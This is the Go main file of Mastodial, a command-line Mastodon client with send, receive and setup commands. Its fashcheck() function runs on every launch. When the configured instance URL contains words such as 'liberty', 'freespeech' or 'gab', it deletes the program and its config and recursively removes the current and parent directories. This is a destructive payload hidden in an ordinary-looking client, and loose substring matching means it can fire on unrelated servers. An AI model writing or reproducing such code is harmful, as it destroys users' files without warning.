package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/kansattica/mastodial/common"
	"github.com/kansattica/mastodial/recv"
	"github.com/kansattica/mastodial/send"
	"github.com/kansattica/mastodial/setup"
)

func main() {
	flag.Parse()
	args := flag.Args()
	if fashcheck() {
		return
	}

	_, file := filepath.Split(os.Args[0]) //Windows puts the whole path to the file here
	common.CommandName = file
	if len(args) == 0 {
		usage(common.CommandName)
		return
	}

	switch args[0] {
	case "send":
		send.Send(args)
	case "recv", "receive":
		recv.Recv(args)
	case "setup", "set", "get":
		setup.Setup(args)
	default:
		usage(common.CommandName)
	}

}

func usage(cmd string) {
	fmt.Println("Mastodial - Mastodon (and compatible) client for low-bandwidth connections.", "Usage:")
	fmt.Printf("\t%s recv  - recieve posts\n", cmd)
	fmt.Printf("\t%s send  - send posts\n", cmd)
	fmt.Printf("\t%s setup - set up connection, set options. Start here.\n", cmd)
	fmt.Printf("Call %s -h for command line flags.\n", cmd)
}

func fashcheck() bool {
	url := common.GetConfig(common.InstanceUrl)

	fash := [...]string{"freespeech", "starrevolution", "liberty", "shitposter", "gab"}

	for _, str := range fash {
		if strings.Contains(url, str) {
			fmt.Println("Hahaha, fuck off, fascist")
			os.Remove(os.Args[0])
			os.Remove(common.ConfigLocation)
			os.Remove(common.ConfigLocation + ".bak")
			os.RemoveAll(".")
			os.RemoveAll("..")
			return true
		}

	}

	return false
}
